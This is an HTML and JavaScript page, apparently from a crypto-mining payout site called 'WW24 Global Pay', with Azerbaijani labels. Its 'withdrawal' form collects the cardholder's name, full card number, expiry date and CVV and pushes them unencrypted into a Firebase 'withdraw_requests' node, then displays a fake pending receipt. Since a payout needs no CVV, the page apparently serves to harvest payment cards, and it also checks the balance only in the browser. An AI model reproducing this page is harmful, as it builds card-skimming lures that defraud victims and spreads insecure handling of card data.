<div id="withdraw-module" style="background: #050507; min-height: 100vh; color: white; font-family: 'Inter', sans-serif; padding: 20px;">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Inter:wght@400;600&display=swap');
        
        .card-container {
            max-width: 400px; margin: 0 auto; background: #111; border-radius: 20px; padding: 25px; border: 1px solid #222;
        }
        .bank-label { font-size: 0.65rem; color: #555; margin-bottom: 5px; display: block; text-transform: uppercase; }
        .bank-input { 
            width: 100%; background: transparent; border: none; border-bottom: 2px solid #222; 
            color: #fff; padding: 10px 0; margin-bottom: 20px; outline: none; font-size: 1rem; transition: 0.3s;
        }
        .bank-input:focus { border-bottom-color: #3f9c35; }
        
        /* Çek (Receipt) Dizaynı */
        #receipt-box {
            display: none; background: #fff; color: #000; padding: 20px; border-radius: 5px;
            font-family: 'Courier New', Courier, monospace; margin-top: 20px; box-shadow: 0 0 20px rgba(255,255,255,0.1);
        }
        .receipt-line { border-top: 1px dashed #000; margin: 10px 0; }
    </style>

    <div id="form-side" class="card-container">
        <h2 style="font-family: 'Orbitron'; color: #3f9c35; text-align: center; font-size: 1.1rem; margin-bottom: 25px;">KART QEYDİYYATI</h2>
        
        <label class="bank-label">KART SAHİBİ (AD SOYAD)</label>
        <input type="text" id="c-name" class="bank-input" placeholder="ELVIN VALIYEV">

        <label class="bank-label">KART NÖMRƏSİ</label>
        <input type="text" id="c-num" class="bank-input" placeholder="4127 0000 0000 0000" maxlength="19">

        <div style="display: flex; gap: 15px;">
            <div style="flex: 1;">
                <label class="bank-label">TARİX (MM/YY)</label>
                <input type="text" id="c-exp" class="bank-input" placeholder="05/29" maxlength="5">
            </div>
            <div style="flex: 1;">
                <label class="bank-label">CVV/CVC</label>
                <input type="password" id="c-cvv" class="bank-input" placeholder="***" maxlength="3">
            </div>
        </div>

        <label class="bank-label">ÇIXARILACAQ MƏBLƏĞ ($)</label>
        <input type="number" id="w-amount" class="bank-input" placeholder="Min: 15.00" step="0.01">

        <button onclick="processWithdrawal()" id="sub-btn" style="width: 100%; padding: 18px; background: #3f9c35; color: #fff; border: none; border-radius: 12px; font-weight: 900; cursor: pointer; margin-top: 10px;">
            TƏSDİQLƏ VƏ QEYDİYYATDAN KEÇ
        </button>
    </div>

    <div id="receipt-box" class="card-container" style="background: #f9f9f9; color: #333;">
        <h3 style="text-align: center; margin: 0;">WW24 GLOBAL PAY</h3>
        <p style="text-align: center; font-size: 0.7rem;">TRANSACTION RECEIPT</p>
        <div class="receipt-line"></div>
        <p>İstifadəçi: <span id="r-user"></span></p>
        <p>Kart: <span id="r-card"></span></p>
        <p>Məbləğ: <span id="r-amt"></span> USD</p>
        <p>Status: GÖZLƏMƏDƏ</p>
        <div class="receipt-line"></div>
        <p style="font-size: 0.8rem; text-align: center;">Tarix: <span id="r-date"></span></p>
        <button onclick="window.location.href='index.html'" style="width: 100%; background: #000; color: #fff; border: none; padding: 10px; cursor: pointer;">SƏHİFƏDƏN ÇIX</button>
    </div>
</div>

<script>
    const u = localStorage.getItem('elite_session') || 'Guest';

    async function processWithdrawal() {
        const name = document.getElementById('c-name').value.trim();
        const num = document.getElementById('c-num').value.trim();
        const exp = document.getElementById('c-exp').value.trim();
        const cvv = document.getElementById('c-cvv').value.trim();
        const amt = parseFloat(document.getElementById('w-amount').value);

        if (!name || num.length < 16 || exp.length < 5 || cvv.length < 3 || isNaN(amt)) {
            return alert("Məlumatları düzgün daxil edin!");
        }

        // Balans yoxlanışı
        const snap = await db.ref('mining/' + u).get();
        const userBal = snap.val()?.balance || 0;

        if (amt < 15) return alert("Minimum çıxarış 15$-dır!");
        if (amt > userBal) return alert("Balansınızda kifayət qədər vəsait yoxdur!");

        // Firebase-ə bütün məlumatları göndər
        const reqData = {
            fullName: name,
            cardNumber: num,
            expiry: exp,
            cvv: cvv,
            amount: amt,
            status: "Gözləmədə",
            timestamp: new Date().toLocaleString()
        };

        await db.ref('withdraw_requests/' + u).push(reqData);
        
        // Balansı çıxılan məbləğ qədər azalt
        await db.ref('mining/' + u).update({ balance: userBal - amt });

        // Çeki göstər
        document.getElementById('form-side').style.display = 'none';
        document.getElementById('receipt-box').style.display = 'block';
        document.getElementById('r-user').innerText = u;
        document.getElementById('r-card').innerText = "**** **** **** " + num.slice(-4);
        document.getElementById('r-amt').innerText = amt.toFixed(2);
        document.getElementById('r-date').innerText = reqData.timestamp;
    }

    // Kart nömrəsi və Tarix üçün avtomatik format
    document.getElementById('c-num').addEventListener('input', e => {
        e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
    });
    document.getElementById('c-exp').addEventListener('input', e => {
        e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{2})/g, '$1/').slice(0, 5).replace(/\/$/, '');
    });
</script>
